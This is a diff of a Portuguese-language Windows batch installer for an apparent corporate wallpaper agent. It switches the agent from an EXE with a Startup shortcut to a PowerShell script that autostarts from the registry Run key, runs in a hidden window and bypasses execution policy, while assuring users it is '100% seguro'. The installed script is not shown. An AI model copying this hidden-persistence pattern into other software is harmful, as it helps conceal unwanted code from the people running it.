@@ -10,36 +10,38 @@ echo Ola! Estamos configurando o seu novo papel de parede dinamico.
 echo Este processo e 100%% seguro e nao pedira senhas.
 echo.
 
-set TARGET_DIR=%LOCALAPPDATA%\CorpWallpaperSystem
-set STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
-set EXE_NAME=WallpaperAgent.exe
-set SHORTCUT_NAME=CorporateWallpaper.lnk
+cd /d "%~dp0"
 
-:: 1. Verificar se o EXE foi compilado
-if not exist "%EXE_NAME%" (
+set TARGET_DIR=%LOCALAPPDATA%\CorpWallpaperSystem
+set SCRIPT_NAME=WallpaperAgent.ps1
+set REG_KEY=HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+set REG_NAME=CorporateWallpaperAgent
+
+:: 1. Verificar se o script existe
+if not exist "%SCRIPT_NAME%" (
     color 0C
-    echo [ERRO] O aplicativo %EXE_NAME% nao esta na mesma pasta.
+    echo [ERRO] O arquivo %SCRIPT_NAME% nao esta na mesma pasta.
     echo Certifique-se de extrair todos os arquivos do ZIP antes de rodar!
     echo.
     pause
     exit /b
 )
 
-:: 2. Encerrar instancia anterior (evita "Acesso negado" ao copiar)
+:: 2. Encerrar instancia anterior se estiver rodando
 echo [+] Preparando o sistema local...
-taskkill /f /im "%EXE_NAME%" /t >nul 2>&1
+powershell -Command "Get-WmiObject Win32_Process | Where-Object { $_.CommandLine -like '*WallpaperAgent*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }" >nul 2>&1
 timeout /t 2 /nobreak >nul
 
-:: 3. Criar a pasta do Agente
+:: 3. Criar pasta de instalacao
 if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"
 
-:: 4. Copiar o executavel (com 3 tentativas em caso de lock)
+:: 4. Copiar o script (com 3 tentativas)
 echo [+] Instalando o agente silencioso na maquina...
 set RETRIES=0
 
 :retry_copy
-copy /y "%EXE_NAME%" "%TARGET_DIR%\%EXE_NAME%" >nul 2>&1
-if exist "%TARGET_DIR%\%EXE_NAME%" goto copy_ok
+copy /y "%SCRIPT_NAME%" "%TARGET_DIR%\%SCRIPT_NAME%" >nul 2>&1
+if exist "%TARGET_DIR%\%SCRIPT_NAME%" goto copy_ok
 
 set /a RETRIES+=1
 if %RETRIES% GEQ 3 goto copy_fail
@@ -51,10 +53,9 @@ goto retry_copy
 color 0C
 echo.
 echo [ERRO] Nao foi possivel copiar o agente apos 3 tentativas.
-echo Possíveis causas:
-echo   - Antivirus bloqueando a copia
-echo   - Outra instancia do programa ainda travada
+echo Possiveis causas:
 echo   - Permissao de pasta negada
+echo   - Outra instancia do programa ainda travada
 echo.
 echo Tente fechar programas e rodar novamente.
 pause
@@ -62,36 +63,26 @@ exit /b
 
 :copy_ok
 
-:: 5. Copiar config.txt se existir na pasta de instalacao
+:: 5. Copiar config.txt se existir
 if exist "config.txt" (
     echo [+] Aplicando configuracoes personalizadas...
     copy /y "config.txt" "%TARGET_DIR%\config.txt" >nul 2>&1
 )
 
-:: 6. Limpar atalho de versao anterior (nome diferente)
-if exist "%STARTUP_DIR%\Wallpaper Corp.lnk" (
-    del /f /q "%STARTUP_DIR%\Wallpaper Corp.lnk" >nul 2>&1
-)
-
-:: 7. Criar atalho no Startup do Windows via PowerShell
+:: 6. Registrar na inicializacao do Windows (HKCU - sem admin)
 echo [+] Registrando rotina silenciosa de atualizacao automatica...
-powershell -NoProfile -ExecutionPolicy Bypass -Command ^
-  "$ws = New-Object -ComObject WScript.Shell; ^
-   $lnk = $ws.CreateShortcut('%STARTUP_DIR%\%SHORTCUT_NAME%'); ^
-   $lnk.TargetPath = '%TARGET_DIR%\%EXE_NAME%'; ^
-   $lnk.WorkingDirectory = '%TARGET_DIR%'; ^
-   $lnk.Description = 'Sincronizador Silencioso do Wallpaper Corporativo'; ^
-   $lnk.Save()"
+reg add "%REG_KEY%" /v "%REG_NAME%" /t REG_SZ /d "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File \"%TARGET_DIR%\%SCRIPT_NAME%\"" /f >nul 2>&1
 
-:: 8. Verificar se o atalho foi criado
-if not exist "%STARTUP_DIR%\%SHORTCUT_NAME%" (
-    echo [AVISO] Atalho de inicializacao nao foi criado. O wallpaper funcionara,
+:: 7. Verificar se o registro foi criado
+reg query "%REG_KEY%" /v "%REG_NAME%" >nul 2>&1
+if errorlevel 1 (
+    echo [AVISO] Registro de inicializacao nao foi criado. O wallpaper funcionara,
     echo         mas nao atualizara automaticamente apos reiniciar o PC.
 )
 
-:: 9. Executar o agente pela primeira vez
+:: 8. Executar o agente pela primeira vez (janela oculta)
 echo [+] Finalizando integracoes e configuracoes...
-start "" "%TARGET_DIR%\%EXE_NAME%"
+start "" powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "%TARGET_DIR%\%SCRIPT_NAME%"
 
 echo.
 echo =================================================================
@@ -102,5 +93,4 @@ echo.
 echo Essa tela fechara sozinha em instantes... Tenha um otimo dia!
 echo.
 echo =================================================================
-:: Aguarda 4 segundos e fecha sozinho
 timeout /t 4 >nul
